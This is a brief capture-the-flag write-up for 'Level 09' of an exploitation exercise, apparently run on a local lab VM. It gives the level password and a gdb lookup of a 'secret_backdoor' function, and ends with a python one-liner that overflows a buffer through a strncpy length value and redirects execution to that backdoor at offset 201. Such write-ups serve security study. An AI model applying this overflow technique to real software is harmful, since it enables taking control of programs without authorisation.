# Level 09
*password : fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S*

## Analyze

```
scp -P 4242 level09@192.168.56.109:level09 binary/
```

## Buffer overflow

- exploit strncpy : n = buffer[180]
    - buffer[180] filled by username

```
(gdb) info funct secret_backdoor
All functions matching regular expression "secret_backdoor":

Non-debugging symbols:
0x000055555555488c  secret_backdoor
```
secret_backdoor address : 0x000055555555488c => 0x00 00 55 55 55 55 48 8c\
- find offset : 201 (= c9 in hexadecimal)
```
$ python -c 'print "\xc9" * 41 + "\n" + "\x41" * 201 + "\x8c\x48\x55\x55\x55\x55\x00\x00"' > /tmp/level09 ; cat /tmp/level09 | ./level09
```
